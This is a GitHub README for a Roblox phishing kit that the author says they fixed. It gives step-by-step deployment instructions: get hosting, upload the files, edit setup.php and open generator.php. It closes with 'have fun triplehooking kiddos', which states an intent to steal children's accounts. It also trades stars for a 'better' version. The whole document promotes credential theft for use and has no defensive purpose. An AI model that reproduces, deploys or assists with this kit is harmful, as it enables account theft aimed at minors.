# Roblox Phishing

**Outdated | New Version -> https://github.com/Terminatedzz/roblox-phishing**

🚀 **Setup** 🚀

[![GitHub stars](https://img.shields.io/github/stars/your-username/your-repository.svg)]([https://github.com/your-username/your-repository/](https://github.com/Terminatedzz/roblox-phishing-Working)stargazers)

This is a roblox phishing source code i fixed :)

## 🌟 Features

- ✨ Follow me 
- ✨ Get me 15 stars on this repo and i post a way better src
- ✨ Star my other repos to

## 🚀 Getting Started

1. find a free hosting or paid hosting like infinity free or any other ones
2. upload files
3. edit setup.php
4. now go to UrDomain/generator.php
5. ur site is now ready for action
6. have fun triplehooking kiddos

### Contact me 
discord: termed_dev

## 📢 Code

- php
- javascript
- html, css
